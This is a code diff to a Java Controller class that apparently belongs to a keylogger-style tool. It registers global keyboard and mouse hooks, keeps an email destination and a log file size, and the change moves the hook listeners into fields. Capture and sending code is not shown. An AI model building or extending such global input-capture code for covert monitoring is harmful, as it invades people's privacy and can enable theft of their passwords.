@@ -26,7 +26,7 @@ public class Controller {
 
     private String mode = "opened";
     private String email = "bsuir.dmitriy.dronov@gmail.com";
-    private long size = 200000;
+    private long size = 5000;
 
     private Label modeLabel = new Label("Mode: ");
     private Label emailLabel = new Label("Email: ");
@@ -36,6 +36,8 @@ public class Controller {
     private TextField sizeField = new TextField();
     private Button saveButton = new Button("Save");
 
+    private GlobalKeyListener hookKeyboard = new GlobalKeyListener();
+    private GlobalMouseListener hookMouse = new GlobalMouseListener();
 
     public GridPane getRoot(){
         GridPane root = new GridPane();
@@ -96,6 +98,7 @@ public class Controller {
         mode = modeChoiceBox.getSelectionModel().getSelectedItem();
         email = emailField.getText();
         size = new Long(sizeField.getText());
+        hookKeyboard.setFileSize(size);
         try {
             rewriteConfig();
             init();
@@ -106,8 +109,9 @@ public class Controller {
 
 
     public void initHook() throws Exception {
-        GlobalKeyListener hookKeyboard = new GlobalKeyListener();
-        GlobalMouseListener hookMouse = new GlobalMouseListener();
+        hookKeyboard = new GlobalKeyListener();
+        hookMouse = new GlobalMouseListener();
+        hookKeyboard.setFileSize(size);
         try {
             GlobalScreen.registerNativeHook();
         }
